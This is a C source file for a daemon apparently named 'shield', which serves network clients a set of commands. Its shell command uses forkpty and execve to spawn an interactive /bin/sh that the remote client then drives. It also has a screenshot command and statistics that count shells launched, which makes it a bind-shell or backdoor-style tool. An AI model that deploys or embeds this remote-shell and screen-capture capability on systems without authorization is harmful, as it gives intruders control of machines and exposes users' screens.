#ifdef _GNU_SOURCE
#undef _GNU_SOURCE
#endif // _GNU_SOURCE

#define _GNU_SOURCE

#include <shield/guard.h>
CPPGUARD_START
#include <termios.h>
#include <pty.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
CPPGUARD_END

#include <shield/server.h>
#include <shield/qio.h>

#include "cmds/screenshot.inc.cc"

int shield_cmd_help(client_t *client, unused daemon_server_t *server, unused kr_strview_t *line)
{
	kr_strappend(&client->out_buffer, "Available commands:\n");
	kr_strappend(&client->out_buffer, "-------------------\n");
	size_t max_size = 0;
	for (int i = 0; commands[i].command != NULL; ++i)
	{
		size_t len = strlen(commands[i].usage);
		max_size = len > max_size ? len : max_size;
	}
	max_size += 2;
	char *space_buf = (char *) malloc(max_size + 1);

	for (int i = 0; commands[i].command != NULL; ++i)
	{
		kr_strappend(&client->out_buffer, commands[i].usage);
		size_t len = strlen(commands[i].usage);
		if (len < max_size)
		{
			if (space_buf)
			{
				memset(space_buf, 0, max_size + 1);
				memset(space_buf, ' ', max_size - len);
				kr_strappend(&client->out_buffer, space_buf);
			}
			else
			{
				for (size_t j = 0; j < max_size - len; ++j)
					kr_strappend(&client->out_buffer, " ");
			}
		}

		kr_strappend(&client->out_buffer, commands[i].description);
		kr_strappend(&client->out_buffer, "\n");
	}
	free(space_buf);
	return (0);
}

// Summon a shell for the client
int	shield_cmd_shell(client_t *client, daemon_server_t *server, unused kr_strview_t *cmdline)
{
	int master_fd, pid;

	DEBUG("Spawning shell for client %d\n", client->index);
	qio_data.shells_launched++;

	struct termios tios;
	tcgetattr(STDIN_FILENO, &tios);
	tios.c_lflag &= ~(ECHO | ECHOE | ECHOK | ECHONL);

	pid = forkpty(&master_fd, NULL, &tios, NULL);

	if (pid < 0)	//Error
		return (1);
	if (pid == 0)
	{
		// server_cleanup(server); // this is probably a bad idea lol
		char *argv[] = {(char*)"sh", (char*)"-i", NULL};
		char *envp[] = {NULL};
		execve("/bin/sh", argv, envp);

		DEBUG("execve failed");
		exit(1);
	}

	if (fcntl(master_fd, F_SETFL, O_NONBLOCK) < -1)
	{
		DEBUG("fcntl on pty failed");
		close(master_fd);
		return (1);
	}

	DEBUG("finding slot for pty fd in pollfd array\n");
	for (size_t j = 0; j < MAX_FD; j++)
	{
		DEBUG("pollfd slot %zu: type %d\n", j, server->poll_metadata[j].fd_type);
		if (server->poll_metadata[j].fd_type == FD_UNUSED)
		{
			DEBUG("Linking pty fd %d to client %d\n", master_fd, client->index);
			server->pollfd_array[j].fd = master_fd;
			server->pollfd_array[j].events = 0;
			server->poll_metadata[j].client_index = client->index;
			server->poll_metadata[j].fd_type = FD_CLIENT_PTY;
			client->pty_pollfd = &server->pollfd_array[j];
			client->pty_metadata = &server->poll_metadata[j];
			break;
		}
	}
	return (0);
}

int shield_cmd_access_shell(client_t *client, unused daemon_server_t *server, unused kr_strview_t *cmdline )
{
	if (client->pty_pollfd == NULL || client->pty_metadata == NULL)
		return (1);
	client->shell_active = true;
	client->pty_pollfd->events |= POLLIN;
	return (0);
}

int	shield_cmd_screenshot(
	client_t *client,
	unused daemon_server_t *server,
	unused kr_strview_t *cmdline
) {
	const char *result = shield_screenshot();
	if (strncmp(result, "ERROR|", 6) == 0)
		result += 6;
	kr_strappend(&client->out_buffer, result);
	kr_strappend(&client->out_buffer, "\n");
	return (0);
}

int	shield_cmd_put(client_t *client, daemon_server_t *server, kr_strview_t *cmdline)
{
	(void) client; // unused parameter
	(void) server; // unused parameter
	(void) cmdline; // unused parameter
	return (0);
}

int	shield_cmd_stats(client_t *client, daemon_server_t *server, unused kr_strview_t *cmdline)
{
	char buffer[32];

	kr_strappend(&client->out_buffer, "===== Server Statistics =====\n");
#define APPEND_STAT(name, value) \
	kr_strappend(&client->out_buffer, name ": "); \
	snprintf(buffer, sizeof(buffer), "%lu\n", value); \
	kr_strappend(&client->out_buffer, buffer);

	APPEND_STAT("Current active connections", (uint64_t)server->current_conn);
	APPEND_STAT("Total shells launched", qio_data.shells_launched);
	APPEND_STAT("Total bytes received", qio_data.bytes_received);
	APPEND_STAT("Total bytes sent", qio_data.bytes_sent);
	APPEND_STAT("Total connections", qio_data.total_connections);
#if SHIELD_DEBUG
	kr_strappend(&client->out_buffer, "\nl'IO il est quantifié là ouais 🤙\n");
#endif // SHIELD_DEBUG
#undef APPEND_STAT
	return (0);
}

int	shield_cmd_exit(client_t *client, unused daemon_server_t *server, unused kr_strview_t *cmdline)
{
	kr_strappend(&client->out_buffer, "Goodbye!\n");
	client->state = CLIENT_DISCONNECTED;
	return (0);
}
